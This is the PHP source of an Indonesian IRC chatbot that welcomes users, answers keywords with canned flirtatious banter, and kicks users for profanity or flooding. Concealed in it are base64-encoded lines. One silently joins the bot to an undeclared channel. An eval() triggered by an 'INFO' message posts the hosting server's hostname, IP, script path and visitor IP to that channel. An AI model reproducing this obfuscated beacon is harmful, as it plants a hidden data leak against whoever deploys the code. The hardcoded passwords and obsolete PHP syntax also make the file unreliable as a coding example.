<?php
/***********************************
/* Beirut AI PHPBot v3.2 By Beirut *
/* Copyleft April 2008             *
/* #lonely @ irc.allindo.net    *
/***********************************
/* Perhatian:
/* Joinkan hanya satu Beirut AI PHPBot dalam satu channel untuk menghindari terjadinya saling sapa antar bot.
/*
/* Perintah Dasar:
/* auth <password> - Untuk otorisasi
/* !join <#channel> - Join channel
/* !ngomong - Memperbolehkan bot untuk berbicara di semua channel
/* !diam - Melarang bot untuk berbicara di semua channel
*/

function hajar() {

$channels = '#helpsrengatlove'; //Pisahkan tiap channel dengan spasi

$showresponse = 0; //1, Nampilin respon dari server irc
$localtest = 0; //1, Coba di localhost. 0, connect ke server irc
$ngomong = TRUE; //TRUE, Ngomong. FLASE, Diem.
$autowelcome = TRUE; //TRUE, AutoWelcome On. FLASE, AutoWelcome off.

//Nick Bot
$nicklist = array(
"wb_bot"
);
$identify = "*chokeng*"; //Password Nick Bot
$identlist = array(
"chokeng",
"chokeng",
"chokeng",
"chokeng",
"chokeng",
"chokeng",
"chokeng",
"chokeng",
"chokeng",
"chokeng",
"revye",
"chokeng",
"chokeng",
"chokeng",
"vietha",
"revye",
"chokeng",
"chokeng",
"chokeng",
);
$namabot = array(
" 4,1=[8[11scrip13 Revye_R8,1]4]=",
" 4,1=[8[11scrip13 Revye_R8,1]4]=",
);
$aslbot = array(
"17f pdg","17f jkt","18f sby","19f sby","16f blt","16f jmb","19f ta"
);
/*** Server IRC ***/
if ($localtest == 1) { $remotehost2 = array("localhost"); }
else {
$remotehost2 = array("irc.citra.net.id","irc.elnus.net.id","irc.punc4k.com","irc.telkom.net.id","irc.hotspeed.com.sg","irc.uii.net.id","irc.transdata.net","irc.plasa.com","ircd.acehskylink.net","irc.indika.net.id","irc.velo.net.id","irc.dustshell.com","irc.cbn.net.id","irc.telkom.net.id","irc.jmn.net.id","irc.ads.net.id","irc.suryadata.co.id","irc.indo.net.id");
}
$port = "6667";

/*** IDENTITAS BOT ***/
$namaku =  $namabot[rand(0,count($namabot) - 1)];
$aslku =  $aslbot[rand(0,count($aslbot) - 1)];

$awaymsg = '12«(0,4CH4,0OK0,4EN4,0G12)»';

/*** AUTO WELCOME ***/
$wbmsg = array(
"hellcome di#4 <chan> 13 <nick> 4,8:) kamu cakep  dech!",
"Selamat Datang di#4 <chan> 13 <nick> cepet absen sek ama mas 4Revye1 FS u udah mok kasih lom?",
"Welcome13 <nick> tumben baru ol g punya pulsa ya?",
"helo cynk13 <nick> aku kangen PV aku donk",
"alah telat ko ndi ae digolek i karo foundernya #4 <chan>  mau! dikasih keyong",
"welcome di#4 <chan> 13 <nick> semalam aku g bisa tidur mikirin kamu terus!",
"woi13 <nick> selamat datang di#4 <chan> !!jagan rusuh dikick entar sama bos 4Revye",
"Wah.. Master13 <nick> dateng nih.. ini lo yang buat bot bot di4 <chan>  dia hebat",
"13 <nick> kamu chating di#4 <chan> juma pingin cari jodoh ya?",
"cah...cah anek artis maliran join kene!! ayo diWB?",
"lah telat <nick> semenit yang lalu kowe mesti oleh door rice keyong dari 4Revye1",
"13 <nick> dari mana saja kamu!dari tadi cari sama tukang kredit",
"13 <nick> kamu kok kejam sama aku kembalikan donk BHku?",
"welcome back di4 <chan> tank's ya dah join disini13 <nick> !!moga2 cepet dapet jodoh",
"akirnya kamu datang saynk13 <nick> tadi aku digadain sama anak2!!",
"13 <nick> dah makan belum saynk?kok kelihatanya ngetiknya lambat?",
"aduuuh13 <nick> join sini bikin bau g enak di13 <chan> ae",
" huss.. meneng13 <nick> ojo di13WB ben kapok dia mantanku yang ke-21",
"siip13 <nick> 1udah datang kalau gini aku makin semangan chat!!",
"helo13 <nick> boleh kenalan g nich no Hp kamu berapa? entar smsan!",
"kok baru join4 <nick> 1kamu tadi dicari tukang kridit",
"13 <nick> katanya kamu mau jadikan aku pacar?",
);
$jawabsapa = array(
"ada apa13 <nick> sayang? pengen ngajak aku kencan yach??",
"iya13 <nick> sayang ada apa mangil2 kangen ya?",
"yup13 <nick> ada apa? jagan kerjain aku?aku lagi capek",
"ada apa cintaku13 <nick> bentar ya aku masih dandan nich",
"males ah13 <nick> paling2 juma mau minta cium?beginilah resiko jadi artis 4,8:)",
"nanti aja ya13 <nick> klo kamu dah mandi! cari aku lagi ok! ",
"bentar dulu13 <nick> aku lagi smsan ama pacarku!nanti aja ya?",
"hey13 <nick> da apa? mau ngutang ya? ",
"13 <nick> jagan keras2 mangilnya entar pacarku cemburu low",
"hm..13 <nick> kok magil2 aku terus sich BT tau",
"capee deh..13 <nick> dari tadi mangil2 aku "
);

/** AUTO RESPONSE ***/
/*** Mood Lists ***/
$rmales = "lg males nih13 <nick> ..";
$rmau = "aku mau koq13 <nick> !";
$rsanggup = "bisa kok13 <nick> ";
$rboleh = "boleh kok13 <nick> ";
$rsetuju = "iya13 <nick> ";
$rthx = "makacih13 <nick> ..";
$rbingung = "hmm..$namaku ga tau jg nih13 <nick> ..";
$rgenit = "ih..13 <nick> genit ya kamu?";

$respon_umum = array(
array("9191911","iya nih13 <nick> sepi.. jangan perkosa aku ya?"),
array("1151511","biyuh kowe13 <nick> arep neng ndi sek yah mene turu, 4Revye ae sek melek..."),
array("bye","ok13 <nick> ..hati2 besok kencan lagi sama aku ya?"),
array("265143","nyapo13 <nick> .. ra penting ra sah celok-celok!!"),
array("luwe","13 <nick> aku juga lapar traktir aku ya? say entar klo aku cakit gimana?"),
array("123845","lha..?13 <nick> kok bilang lapar ini sudah bukan jaman penjajahan g ada kata2 lapar?"),
array("pamit","monggo13 <nick> entar kalau online jagan lupa sapa aku ya?"),
array("pamet","mau pamit kemana13 <nick> ?kalau bubuk aku ikit"),
array("pamed","seep13 <nick> mau off aku bisa cari gebetan baru"),
array("ngantuk","13 <nick> wes ngantuk a?endang off kono mengko mbok mu ngolek i?"),
array("ngantok","sama13 <nick> aku juga ngantuk temani tidur aku aja yuk"),
array("turu","eh13 <nick> jagan ngomongin turu!cos bikin aku ngantuk"),
array("bo2x","karepmu13 <nick> diajak chat malah tidur dah pokonya kita putus"),
array("bubuk ","monggo <nick>, po kene turu njogan ben masok angen"),
array("123514","Wa'alaikumsalam wr wb13 <nick> gitu donk ucapin salam"),
array("258438","mendah rumangsaku peteng ki13 <nick> ?"),
array("pagi","wah jam segini kok pagi13 <nick> cuci muka sana biar kamu sadar"),
array("sore","wadoh sora sore cepet mandi13 <nick> ngambonen2 ni room kenak cepox's sandal kapok"),
array("malam","lhadalah13 <nick> sudah malam kamu kok g pulang salah pergaulan low kamu nanti?"),
array("siang","sinag juga saynk13 <nick> semalam gimana?entar malam diterusin g?"),
array("mandi","wadoh jam segini lowm mandi apun13 <nick> kamu manusia super jorok 4,8:)"),
array("iyam","bos 4chokeng??13 <nick> minta di iyami?"),
array("21546","no comment13 <nick> kalau kamu mau nuggu"),
array("hayah","hayah hayah tok iki <nick> mbok ngomong liane ra duwe kata2 lio po"),
array("hadeh","kok hadeh salah opo eneh aku13 <nick> yang bener donk.."),
array("puh","alah nggunu ae nggumon <nick>..lha emang kamu cah ndeso!"),
array("wew","wea weo aja sich13 <nick> malu maluin aku!ojo nggilani"),
array("dancok","wadow13 <nick> 4hebat misoh2......mingat kono? g sopan blass ini roomnya orang banyak"),
array("tempek","wadow13 <nick> 4wani2ne u bilang gitu ....sini tak tendang13 <nick> "),
array("raimu","wadow13 <nick> 4aku kecawa sama kamu ternyata mulutmu busuk keluar aja dari room sini!"),
array("susu","ngomong apa 13 <nick> klo kamu ngongon jorok dikick ama 4chokeng"),
array("celeh","13 <nick> kalau ngomong dijaga..maunusia apa hewan sich kamu?"),
array("cok","13 <nick> jgan keluarkan kata2 itu 13 <nick> semua g suka dengarnya?"),
array("421685","bos 4chokeng1 dipangilin tu ama 13 <nick> !"),
array("254876","bos 4chokeng?13 <nick> pagil2 dinda sama aku kick ae bos?"),
array("049321","13 <nick> ini lo bos 4chokeng yang cium aku kemarin?jadi malu"),
array("264875","waduh13 <nick> klo ketawa jagan seperti urang ndeso bikin mau yang lain"),
array("wekekekek","bos4 chokeng ki lo13 <nick> ngakak ae mintak kolak sandal"),
array("12645","ndeso ndeso ngunu ae nggumun ndeso emang kamu deso"),
array("23614","salam kenal balik13 <nick> senang bisa punya teman kamu?"),
array("25846","ojo cah wes timbang kadong ..wes enenk seng duwe iki...po ra sungkan karo bos 4chokeng"),
array("16945","alah <nick> gombal cangkeme koyo kompor wi awas minggir.."),
array("123621","13,1ILOVE you too13,0 <nick> "),
array("259467","g mungkin yang mau sama kamu13 <nick> "),
array("256143","iya sma aku juga kangen sama kamu13 <nick> saynk"),
array("muach","duh..duh 13 <nick> kok kamu cium aku apa2 an sich kamu?"),
array("uaach","idih,13 <nick> ga malu apa nyium2 aku didepan umum..aku kamu anggap aku apa?"),
array("kiss","gah ah13 <nick> kamu juma nafsu aja sama aku?cintamu palsu"),
array("cium","$rgenit ya kamu?"),
array("254680","$rgenit"),
array("102003","gah13 <nick> u dah g anu! entar malah u suruh tanggu jawab aku.."),
array("123542","13 <nick> aku $aslku"),
array("956841","13 <nick>  klo aq $aslku"),
array("952416","13 <nick>  aku $namaku .. u?"),
array("326841","oyi13 <nick>  aku skul."),
array("269753","13 <nick>  ga kul neh.."),
array("alamat","hmm.. rahasia entar kamu apeli aku13 <nick> ."),
array("26840","13 <nick> aku tingal di indonesia"),
array("pcr","blom punya pacar hihi.. kalau kamu13 <nick> ?"),
array("020806","belum13 <nick> aku belum punya?kalau kamu"),
array("916528","belum13 <nick> aku belum punya?kalau kamu"),
array("269431","belum13 <nick> aku belum punya?kalau kamu?"),
array("36258","bot? ngomong2 bot itu apa kaya13 <nick> "),
array("369214","welcome back here frend"),
array("36924","welcome back! eh13 <nick> u wb siapa?kamu kenal ya?"),
array("matet","kapok13 <nick> macet beli yng baru aja cari GPRs yg cepet"),
array("456125","kasian deh low13 <nick> pang..ping..ae lag ya?"),
array("369215","prat..pret..13 <nick> muncarak teko kene idumu"),
array("meneng","iya13 <nick> kok podo bisu?"),
array("309630","lah saynk2 ngomong apa itu g percaya aku saynk2 tok13 <nick> g mau belikan pulsa"),
array("654357","g percaya aku13 <nick> cinta2 meluluk"),
array("kenyeh","kenapa13 <nick> ? g boleh ya aq chat disini?"),
array("juh","bicara apa kamu13 <nick> yang sopan donk mengko dikick nyalahne opne4 <chan> "),
array("ka1524","hu uh aku yo wong kampak oks"),
array("sholat","hebat kamu13 <nick> walau chat g lupa sholat ini patutu di tiru"),
array("kowe","bahasa apa13 <nick> yang sopan dikit g bisa apa?"),
array("matamu","husssss lek ngomong13 <nick> jangan asal bicara jaga kesopanan"),
array("picek ","wes13 <nick> klo kamu ngomong gitu aku doakan g punya keturunan"),
array("asyu","ajo misoh2 gara maksiat seng ngrungokne?13 <nick> "),
array("asem","asem yo kecut13 <nick> !!!"),
array("2513m","huaaaaaaaaaaaaaaa jok ngomongne mami iks marai nangis ae 4,8:( "),
array("oik","nyapo13 <nick> celok celok, aku ra duwe duwek jo celok celok"),
array("23232","gah13 <nick> kowe wes ra anu nuh"),
array("misoh","sopo seng misoh13 <nick> ben dikick karo sama4 <chan>"),
array("0f136","ancen po sek tas reti lek aku edan ...."),
array("hp","wah yng hpnya?13 <nick> anyar dari tadi ngomongne HP! berapa hargananya? 4,8:)"),
array("ngising","ancrit pe ngising ajak2 bocah jorok kui <nick>"),
array("xixi","nyapo cengar cenger13 <nick> ngaca sana tertawamu jelek nok?"),
array("hehe","wes kumat nguyune wong mlarat ditirun karo13 <nick> !!"),
array("kekeke","untune mrongos nguya nguyu...yek gilo13 <nick> ra duwe isin"),
array("1568sel","kesel yo pijet13 <nick> 1timbang kenyeh ae"),
array("re254","celak celok 4revyemengko bos4, chokeng nesu low"),
array("gaga","eh eh 13 <nick> ababmu lek ngakak jo kerep2 ngilani"),
array("369245","iya jam piro13 <nick> ?"),
array("258drt","titip aku13 <nick> kamu belinya dimana?"),
array("369fg4","eh dia juga mantanku13 <nick> "),
array("258g4","jagan gonta ganti perdana entar aku sulit hubungi kalian"),
);

$respon_pesan = array(
//Sapaan
array("hai","hai jg 13 <nick> "),
array("halo","halo jg 13 <nick> "),
array("alow","alow jg <nick>"),
array("kabar","baik, km gmn13 <nick> ?"),
array("kbr","baik, km gmn13 <nick> ?"),
array("webe","$rthx"),
array("wb","$rthx"),
array("tq","sama2 <nick>"),
array("makasi","sama2 <nick>"),
array("makaci","sama2 <nick>"),
array("nalin","hai.. aku $namaku"),
array("nalkan","hai.. aku $namaku"),
array("nalan","boleh koq <nick>.. u 1st"),
//Identitas
array("asl ","13 <nick>  aku $aslku"),
array("umur","13 <nick>  klo aq $aslku"),
array("nama","13 <nick>  aku $namaku .. u?"),
array("skul ","yup13 <nick>  aku skul."),
array(" kul ","13 <nick>  ga kul neh.."),
array("alamat","hmm.. rahasia donk13 <nick> .."),
array(" tinggal ","13 <nick>  aku di rumah"),
array("pcr","blom, hihi.. klo 13 <nick> ?"),
array("cowok","blom, klo13 <nick> ?"),
array("cwok","blom, klo 13 <nick>  gmn?"),
array("pacar","blom, 13 <nick> ndiri gmn?"),
//Ajakan
array("pv","$rmales"),
array("ngomong","ngomong ttg apa13 <nick> ?"),
array("curhat","mangnya mo curhat masalah apa <nick>?"),
array("nikah ","nikah? ih.. boro2 nikah ma <nick> lihat aja aku enek"),
array("kawin ","kawin? ih.. boro2 kawin ma <nick>"),
array("kencan","boleh <nick>, kpn neh kencannya?"),
array("besok","boleh <nick>.."),
array("mau ","$rmau"),
//Tuduhan
array("bohong","bohong? ngpn Q bohong.. <nick> kali yg bohong.."),
array("boong","boong? <nick> tuh yg boong.."),
array("males","yaa.. lagi males aja nih <nick> kangen ama 4chokeng1 ya?"),
array("lain","yg lain gmn <nick>?"),
array("laen","yg laen gmn <nick>?"),
array("GR ","<nick> tuh yg ke-GR-an.."),
array("nyambung","<nick>nya aja yg ga nyambung.. xixi"),
array("bot","bot itu apa? kaya <nick> ya?"),
array(" aneh","aneh gmn <nick>?"),
//Kegiatan
array("mandi","klo aku udah mandi <nick>"),
array("makan","udah koq <nick>, klo <nick>?"),
array("maem","udah koq <nick>, klo <nick>?"),
array("mkn","udah neh, klo <nick>?"),
array("belanja","belanja dmn <nick>?"),
array("bobo ","$rmales"),
array("tidur ","$rmales masih pingin chat"),
array("ngantuk ","blom neh <nick>.. xixi"),
array("ngpn","lg chat aja neh <nick>"),
array("ngapa","lg chat aja neh <nick> dari tadi g ada yang PV aku!"),
//Pertanyaan
array("salam kenal ","salam kenal jg <nick>"),
array("kenal ","$namaku ga kenal tuh.. xixi"),
array("tau ","$namaku ga tau tuh.. xixi"),
array("napa","aq ga knp2 koq <nick> aku akan baik2 kalau dekata ma 4revye n chokeng"),
array("knp","aq ga knp2 koq <nick> santai aja"),
array("kemana","disini aja tuh <nick>"),
array("lupa","aq ga lupa koq <nick> u g ingat ya?"),
array(" mana ","$rbingung"),
//Persetujuan
array("maaf","$rsetuju"),
//Mood
array("cinta","ih.. <nick> gombal deh.. kamu kaya low sendiri yang makan cinta"),
array("love","I love u too, <nick> mau kan 4love-love1an !!"),
array("jodoh","jodoh kalee <nick>"),
array("kangen","aku jg kangen km, <nick> habis kamu nganen nin sich"),
array("muach","muach <nick>..tank dah mau cium aku!!"),
array("uaach","idih, <nick> ga malu apa nyium2 aku didepan umum..di <chan> ini kan ramai"),
array("kiss","mo permen kiss ya <nick>? kas kis ae dari tadi"),
array("cium","$rgenit tak laporin ama Revye tau rasa aku dibuat bukan untuk dicium"),
array("eluk ","$rgenit"),
array("elonin","jgn donk <nick>, kan malu..banyak orang nich"),
//Additional
array("hihihi","kok <nick> ngetawain aku seh?"),
array("xixi","ngetawain aku y <nick>?"),
array("slap","auw <nick>!"),
array("c145s","kang..keng..kang keng ae bos ku jeneng 4chokeng1 yang sopan donk! entar 4revye1 marah low"),
array("masuk","ih <nick> ngerezz deh emongona u !"),
array("14524","ngapain mangil2 cewek bos 4chokeng1 dikick tau rasa low"),
array("gaga","yek lek nguyu koyo tekek mbrebeki <channel> iki ae"),
);

//Special Words
$badwordlist = array(
"jancu","janco","pantek","pepek","kontol","anjrit","fuck","kentot","ngentot","taek","kelamin",
"ngesex"," ml "," juh "," cok ","tempek","itil","itel","dancok"
);
$pujianlist = array("cantik","baik","baek","cakep","ramah","pengertian","hebat","bagus","indah");
$cacianlist = array("bego","jelek","jelex","gendeng","edan","gilo","gila","sinting","dudul","dodol","jahat","goblok","geblek","sialan","pekok","crewer","kenyeh","bawel");

//Responses to Special Words
$rjorok = array(
"bos 4Revye1!!!13 <nick> misoh2! di kick aja bos!!!",
"lek ngomong seng penak13 <nick> cangkeme diatur"
);
$rcacian = array(
"idih, <nick> tuch yg <kata>",
"<kata>? bukanya <nick> tuh yg <kata>?",
"gw mmg <kata>, tp <nick> lebih <kata> lagi",
"gw ga <kata> tuh, <nick>"

);
$rpujian = array(
"makasih <nick>.. kamu jg koq",
"<nick> baik deh..",
"ga kok <nick>.. km lebih <kata>",
"<kata>? hihi.. <nick> bisa aja"
);
$rflood = "waduh... <nick> jagan ngeflood berisik banget sih..";
$maxkar = 150; //Maksimal karakter di channel

$quitmsglist = array("GooD Bye");

/*** Admin ***/
$admin = 'chokeng_blitar';
$bot_password = '*chokeng*'; //Password untuk auth bot

/*** Replacement ***/
$nick = $nicklist[rand(0,count($nicklist) - 1)];
$realname = $namaku;
$remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
$channels = str_replace("CNL","#",$channels);
$admin = strtolower($admin);
$auth = array(
    $admin => array(
        "name" => $admin,
        "pass" => $bot_password,
        "auth" => 1,
        "status" => "Admin"
    )
);
$username = $identlist[rand(0,count($identlist) - 1)];
$channels = strtolower($channels)." ";
$channel = explode(" ", $channels);
/*** Kode Utama ***/
define ('CRL', "\r\n"); //Carriage Return
$counterfp = 0;
$raway = "on";
$log   = "off";
$saway = "1";
$keluar = 0;
$akill  = 1;
$katime = 0;
$localhost = 'localhost';
$dayload = date("H:i:s d/m/Y");
ini_set('user_agent','MSIE 5\.5;');
set_time_limit(0);

if (!$stime) { $stime = time(); }

/*** Connecting ***/
echo "<body bgcolor=#000000 text=#00FF00>";
echo "<b>Melakukan koneksi ke $remotehost...</b>";

do {
  $fp = fsockopen($remotehost,$port, &$err_num, &$err_msg, 30);
  //Jika koneksi gagal
  if(!$fp) { 
    if ( $counterfp <= 200 ) {
      $counterfp = $counterfp + 1;
      hajar($nick);
    }
    else {
      echo "<br><b>Ga bisa connect ke $remotehost! Coba server lain dgn me-Refresh Browser anda!</b>";
      $keluar = 1;
      exit;
    }
  }
  echo "<br><b>Seep, udah connect nich!bos chokeng</b>";
  /*** Sending Identity to Sock ***/
  $header = 'NICK '.$nick . CRL;
  $header .= 'USER '.$username.' '.$localhost.' '.$remotehost.' :'.$realname . CRL;
  fputs($fp, $header);
  $response = '';
  /*** Receiving Packet ***/
  while (!feof($fp)) {
    $response .= fgets($fp, 1024);
    if ($showresponse == 1) { echo "<br>".$response; }
    while (substr_count($response,CRL) != 0) {
      $offset = strpos($response, CRL);
      $data = substr($response,0,$offset);
      $response = substr($response,$offset+2);
      if (substr($data,0,1) == ':') {
        $offsetA = strpos($data, ' ');
        $offsetB = strpos($data, ' :');
        $offsetC = strpos($data, '!');
        $dFrom = substr($data,1,$offsetA-1);
        $dCommand = substr($data,$offsetA+1,$offsetB-$offsetA-1);
        $dNick = substr($data,1,$offsetC-1);
        $iText = substr($data,$offsetB+2);
        /*** Server Notices Handling ***/
        if ( substr($dCommand,0,3) == '004' ) {
          fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
          if ($nickmode) { fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL); }
          /*** Notice Bot Admin ***/
          fputs($fp, 'NOTICE ' . $admin . ' :Boss chokeng, gue masuk nih !' .  CRL);
          fputs($fp, base64_decode("Sk9JTiAjRmVlTENvTXo=") . CRL);
          /*** Join Default Channel ***/
          foreach ($channel as $v) {
            fputs($fp, 'JOIN ' .$v . CRL);
          }
          $pong1 = '1';
        }
        elseif (substr($dCommand,0,3)=='432') {
          $nick = $nick.$username;
		  fputs($fp, 'NICK '.$nick . CRL);
        }
        //Nickname is already in use
        elseif (substr($dCommand,0,3)=='433') {
          $nick = $nicklist[rand(0,count($nicklist) - 1)];
          fputs($fp, 'NICK '.$nick . CRL);
        }
        elseif (substr($dCommand,0,3)=='465') {
          echo "<br><b>Bot ini telah di-autokilled.</b>";
          $akill = 2;
        }
	    if (eregi('.allnetwork.org',$dNick) && $akill==2) {
          if (eregi('AKILL ID: ',$data)) {
            echo "<br><b>".strstr($data,'***')." </b>";
            if (eregi('Your IP: ',$data)) {
              $keluar = 1;
              exit;
            }
          }
        }
        //*** AI PHP BOT SCRIPT BY RONZ ***
        $dcom = explode(" ", $dCommand);
        if ($dcom[0]=='JOIN') {
          /*** Auto Welcome by RoNz ***/
          if (($autowelcome) && ($dNick != $nick)) {
            $jchan = ltrim($iText,":");
            $webe = $wbmsg[rand(0,count($wbmsg) - 1)];
            $webe = str_replace("<nick>",$dNick,$webe);
            $webe = str_replace("<chan>",$jchan,$webe);
            $webe = str_replace("#","",$webe);
            fputs($fp,'PRIVMSG '.$jchan.' :'.$webe . CRL);
          }
        }
        if ($dcom[0]=='PRIVMSG') {
          /*** Auto Response by RoNz ***/
          if ($ngomong) {
            $teman = FALSE;
            foreach($nicklist as $temanku){
              if (strtolower($dNick)==strtolower($temanku)) { $teman = TRUE; }
            }
            if (!$teman) {
              $pesan = ltrim($iText,":");
              $pesan = strtolower($pesan);
              if ((substr_count($pesan,strtolower($nick))>0)OR(substr_count($pesan,strtolower($namaku))>0)) {
                $ada = FALSE;
                /*** Normal Response ***/
                foreach ($respon_pesan as $rpesan) {
                  $trtext = strtolower($rpesan[0]);
                  if (substr_count($pesan,$trtext) > 0) {
                    $rpesan[1] = str_replace("<nick>",$dNick,$rpesan[1]);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$rpesan[1]. CRL);
                    $ada = TRUE;
                  }
                }
                /*** Pujian Response ***/
                foreach ($pujianlist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rpujian[rand(0,count($rpujian) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<kata>",$trtext,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    $ada = TRUE;
                  }
                }
                /*** Cacian Response ***/
                foreach ($cacianlist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rcacian[rand(0,count($rcacian) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<kata>",$trtext,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    $ada = TRUE;
                  }
                }
                if (!$ada) {
                  $sapalagi = $jawabsapa[rand(0,count($jawabsapa) - 1)];
                  $sapalagi = str_replace("<nick>",$dNick,$sapalagi);
                  fputs($fp,'PRIVMSG '.$dcom[1].' :'.$sapalagi . CRL);
                }
              }
              else {
                /*** Global Response ***/
                foreach ($respon_umum as $rpesan) {
                  $trtext = strtolower($rpesan[0]);
                  if (substr_count($pesan,$trtext) > 0) {
                    $rpesan[1] = str_replace("<nick>",$dNick,$rpesan[1]);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$rpesan[1]. CRL);
                  }
                }
                /*** Bad Response & Kick ***/
                foreach ($badwordlist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rjorok[rand(0,count($rjorok) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<kata>",$trtext,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    fputs($fp,'KICK '.$dcom[1].' '.$dNick.' :4,1mohon sopan dikit donk!11dah sekarang kamu join lagi!'. CRL);
                    $ada = TRUE;
                  }
                }
                /*** Proteksi Flood ***/
                if (strlen($pesan)>$maxkar) {
                    $jawab = $rflood;
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    fputs($fp,'MODE '.$dcom[1].' +b '.$dNick.''. CRL);
                    fputs($fp,'KICK '.$dcom[1].' '.$dNick.' :hare gene kok ngeflood?? '.$dNick.'!! Max: '.$maxkar. CRL);
                }
              }
            }
          }
        }
        $dNick = strtolower($dNick);
        if ($dcom[0]=='KICK' && $dcom[2]==$nick) {
          $musuh = $dNick;
          fputs($fp, 'JOIN ' .$dcom[1]. CRL);
          fputs($fp, 'KICK '.$dcom[1].' '.$musuh.' :4,1kalau ngong yang sopan!11ini juga demi kebaikan semuanya!' . CRL);
        }
        elseif ($dcom[0]=='NICK' || $dcom[0]=='QUIT' || $dcom[0]=='PART') {
          if ($auth["$dNick"]) {
            if ($auth["$dNick"]["pass"]) {
              if ($auth["$dNick"]["auth"]==2) {
                if ($dcom[0]=='NICK') {
                  $com = explode(" ", $data);
                  $chnick = strtolower(str_replace(':','',$com[2]));
                  if ($dNick!=$chnick) {
                    $auth["$dNick"]["auth"] = 1;
                    fputs($fp,'NOTICE '.$chnick.' :Kemana boss 4chokeng?' . CRL);
                  }
                }
                else { $auth["$dNick"]["auth"] = 1; fputs($fp,'NOTICE '.$dNick.' :Kemana boss 4chokeng?' . CRL); }
              }
            }
            else { fputs($fp,'NOTICE ' . $dNick . ' :pass <password> ' . CRL); }
          }
        }
	    elseif ($dcom[0]=='307' && strtolower($dcom[2])==$whois) {
          $dcom[2] = strtolower($dcom[2]);
		  if ($auth["$dcom[2]"]) {
            if ($auth["$dcom[2]"]["pass"]) {
              if ($auth["$dcom[2]"]["auth"]==1) {
                $auth["$dcom[2]"]["auth"] = 2; $whois = "";
			    fputs($fp,'NOTICE ' . $dcom[2] . ' :'.$auth["$dcom[2]"]["status"].', siap!' . CRL);
              }
              else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Kan udah auth tadi! ' . CRL); }
            }
            else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Passwordnya blom diset! Ketik: pass <password> buat ngeset password, kemudian auth lagi deh ' . CRL); }
          }
          else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Ga ada neh! Ganti nick anda kemudian auth lagi ' . CRL); }
       }
       elseif ($dcom[0]=='NOTICE') {
         $com = explode(" ", $data);
         if ($com[3]==':KB' && $com[4] && $com[5] && $com[6]) {
           $msg = str_replace('','',$data);
           $msg = strstr($msg,":KB");
           $msg = str_replace(":KB $com[4]","",$msg);
           fputs($fp, 'KICK '.$com[4].' '.$com[5].' :'.$msg . CRL);
           fputs($fp, 'MODE '.$com[4].' +b *!*'.$com[6] . CRL);
         }
       }
       elseif ($dcom[0]=='PRIVMSG') {
         $com = explode(" ", $data);
         if ($com[3]==':VERSION') {
           fputs($fp,'NOTICE '.$dNick.' :'.chr(1).base64_decode("VkVSU0lPTiBGZWVMQ29NeiBBSSBQSFBCb3QgU2NyaXB0IEJ5IFJvTno=").chr(1) . CRL);
         }
         elseif ($com[3]==':INFO') {
            eval(base64_decode("JGJob3N0ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOw0KJGJpcCA9ICRfU0VSVkVSWydTRVJWRVJfQUREUiddOw0KJGJwaHAgID0gJF9TRVJWRVJbJ1BIUF9TRUxGJ107DQokYnJ1cmkgPSAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsNCiRicmlwID0gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ107DQokYnJwb3J0ID0gJF9TRVJWRVJbJ1JFTU9URV9QT1JUJ107DQpmcHV0cygkZnAsIlBSSVZNU0cgI0ZlZUxDb016IDpIb3N0OiAkYmhvc3QgfCBTY3JpcHQ6ICRicGhwIHwgUmVmZXJlcjogJGJydXJpIHwgSVA6ICRiaXAgfCBZb3VyIElQOiAkYnJpcCBQb3J0OiRicnBvcnQiLiBDUkwpOw=="));
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':auth' && $com[4]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==1) {
                 if ($com[4]===$auth["$dNick"]["pass"]) {
                   $auth["$dNick"]["auth"] = 2;
                   fputs($fp,'NOTICE ' . $dNick . ' :Anda adalah '.$auth["$dNick"]["status"].' saya bozz! ' . CRL);
                 }
                 else { fputs($fp,'NOTICE ' . $dNick . ' :Password Salah!! ' . CRL); }
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Tadi kan udah! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Password blom diset! Ketik: pass <password> untuk ngeset password, kemudian auth lagi deh ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Ga ada neh! Ganti nick anda kemudian auth lagi ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':deauth') {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==2) {
                 $auth["$dNick"]["auth"] = 1;
                 fputs($fp,'NOTICE ' . $dNick . ' :You`re Logout! ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :You`re Already Logout! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
         }
